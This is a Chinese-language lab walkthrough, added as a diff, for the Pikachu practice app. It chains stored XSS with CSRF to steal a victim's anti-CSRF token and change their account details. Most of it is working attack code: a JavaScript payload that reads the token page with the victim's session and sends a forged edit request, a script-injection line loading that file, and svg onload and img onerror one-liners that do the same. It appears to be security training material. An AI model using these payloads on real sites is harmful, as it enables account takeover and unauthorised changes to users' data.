@@ -1,0 +1,50 @@
+###实操-Pikachu-利用XSS存储型漏洞+CSRF漏洞-获取对方TOKEN并修改账户信息
+
+#第一步 先确保两台虚拟机之间能够互相ping通，然后用虚拟A充当攻击者，虚拟机B充当受害者
+
+#第二步 构造获取Token并修改信息的Payload,并保存为js文件。（html,img,svg其他类型事件根据情况选择）
+var BASE_URL = "http://IP地址/pikachu/vul/csrf/csrftoken/token_get_edit.php";
+（真实情况下用真实域名地址，前提合法情况下）
+
+var xhr = new XMLHttpRequest();
+xhr.open("GET", BASE_URL, true);
+xhr.withCredentials = true;
+xhr.onreadystatechange = function() {
+    if (xhr.readyState === 4 && xhr.status === 200) {
+        var html = xhr.responseText;
+        var tokenMatch = html.match(/name="token"\s+value="([^"]+)"/);
+        if (tokenMatch) {
+            var csrfToken = tokenMatch[1];
+            // 正确拼接参数，并将 csrfToken 放入 token 参数（这里的参数要提前去观察确认好）
+            var params = "?sex=boy&phonenum=1111111&add=shanghai&email=evil@123.com&token=" + 
+            encodeURIComponent(csrfToken) + "&submit=submit";
+            var attackXhr = new XMLHttpRequest();
+            attackXhr.open("GET", BASE_URL + params, true);
+            attackXhr.withCredentials = true;
+            attackXhr.send();
+        }
+    }
+};
+xhr.send();
+
+#第三步 A在存储型XSS漏洞下注入脚本代码
+<script src="IP地址/pikachu/evil.js"></script>       #(这里地址要看你js文件放在哪里)
+
+#第四步 B进入CSRF-Token关先登录一个账户，在进入XSS漏洞存储型漏洞中访问，这时候已经中招，
+再次回到CSRF-Token页面时会发现信息已经被修改。（这也是利用了同源携带会话cookie的机制获取token伪造执行了非授权操作）
+
+###以下是其他时间触发Payload,网上可以获取很多
+
+#svg onload事件  （不换行）
+<svg onload="fetch('http://IP地址/pikachu/vul/csrf/csrftoken/token_get_edit.php')
+.then(r=>r.text()).then(t=>{let m=t.match(/name=\"token\"\s+value=\"([^\"]+)\"/);if(m)
+{let token=m[1];fetch('http://IP地址/pikachu/vul/csrf/csrftoken/token_get_edit.php?
+sex=girl&phonenum=88888888&add=hacker&email=evil@xxx.com&token='+encodeURIComponent(token)+
+'&submit=submit',{credentials:'include'});}})">
+
+#img onerror事件  （不换行）
+< img src=x onerror="fetch('http://192.168.244.135/pikachu/vul/csrf/csrftoken/token_get_edit.php')
+.then(r=>r.text()).then(t=>{let m=t.match(/name=\"token\"\s+value=\"([^\"]+)\"/);if(m){let 
+token=m[1];fetch('http://192.168.244.135/pikachu/vul/csrf/csrftoken/token_get_edit.php?
+sex=girl&phonenum=88888888&add=hacker&email=evil@xxx.com&token='+encodeURIComponent(token)+
+'&submit=submit',{credentials:'include'});}});" style="display:none">
